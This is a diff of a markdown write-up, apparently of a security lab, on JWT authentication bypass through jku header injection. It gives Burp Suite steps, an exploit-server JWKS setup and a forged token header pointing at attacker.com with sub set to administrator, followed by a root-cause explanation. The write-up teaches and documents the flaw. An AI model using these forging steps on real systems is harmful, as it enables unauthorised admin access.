@@ -18,26 +18,23 @@ JWT verification middleware on the session/authentication layer (endpoint that v
 
 ## Steps to Reproduce
 
-1. Log in as a low-privileged user and capture the issued JWT
-2. Generate an RSA key pair locally 
-
-This requires Burp JWT Editor extension so make sure to install it, then there is the **JWT editor** panel. In there, click **New RSA Key** and click **Generate**. 
-
-3. Host a JWKS document containing the new **public** key at an attacker-controlled URL (e.g. exploit server `/jwks.json`). 
-
-In the lab go to **exploit sever**  and add **`/jwks.json`** to the File box
-
-4. Go back to repeater>JWT Editor, modify the token: 
-- Add a new line in header `"jku": "EXPLOIT_SERVER_URL/jwks.json"`
-- In payload, set `sub`claim to `administrator`.
-5. Click Sign and make sure the “don’t modify the header” is selected.
-6. Replace the original token in the request/cookie with the forged one.
-7. Send the request to a privileged endpoint (e.g. `/admin`) — access is granted.
+1. Get authenticated as a low-privileged user (wiener) in `https://TARGET_URL/my-account`
+2. Go to Burp and proxy panel, in HTTP history look for `GET /my-account?id=USERNAME HTTP/2` request
+3. Copy the first segment of the cookie (double click the first line of the cookie and the first portion will get selected), right click and decode it. Observe that the application uses `RS256` (ex: `{"kid":"372129e6-8fff-4cdb-9140-65a5ee8e59d3","alg":"RS256"}`). Application usage on JWT-based session cookie is confirmed.
+4. In Burp's JWT Editor extension, generate a new `2048-bit` RSA key pair. Note the `kid` value (e.g. `0fd329e6-dbd7-4ac5-b55e-87252f2aa470`).
+5. Copy the public key as JWK (right-click key → **Copy Public Key as JWK)**.
+6. Host the following JWKS document at an attacker-controlled URL:
+- In exploit server, paste the following exploit server body and replace `PASTE_PUBLIC_JWK_HERE` with the copied public key
+- Input `/jwks.json` in the **File:** box
+- Paste that 2-line head values in the POC
+- Click store
+7. back to Burp Repeater, in the JSON Web Token tab, replace the entire value of **header** with the one in POC.
+8. In payload section, set `"sub": "administrator"`.
+9. Click Sign, make sure "Don't modify header" is checked, select the generated RSA key and click **OK**
+10. Send the request.
+The server fetches the JWKS from the attacker URL, finds the public key matching `kid`, verifies the signature (which passes because the attacker signed with the matching private key), trusts `sub: administrator`, and grants admin access.
 
 ## Proof of Concept
-
-- Request/response showing admin panel access with the forged token (screenshot/HTTP trace attached).
-
 **Body value in exploit server**
 
 ```jsx
@@ -47,11 +44,30 @@ In the lab go to **exploit sever**  and add **`/jwks.json`** to the File box
     ]
 }
 ```
+
+**Head section in exploit server** 
+```pascal
+HTTP/1.1 200 OK
+Content-Type: application/json
+```
+
+**Value of header in JWT web token**
+```jsx
+{
+    "kid": "PASTE_YOUR_KID_HERE",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jku": "https://attacker.com/jwks.json"
+}
+```
+**Request/response showing admin panel access with the forged token (screenshot/HTTP trace attached)**
 <img width="1455" height="787" alt="image" src="https://github.com/user-attachments/assets/d7397d5a-441b-49cb-bddb-9f564102ed5d" />
 
 ## Root Cause
 
 The server resolves the signing key dynamically from a URL supplied inside the token itself (`jku` header) rather than validating against a fixed, trusted key or a strict allowlist of key-source domains. This inverts trust: the attacker, who controls the token, also controls what's treated as the trusted verification key.
+
+## So how can this decoded cookie segment trigger an attacker to bypass authentication? Especially via jku Header Injection?
 
 ## Impact
 
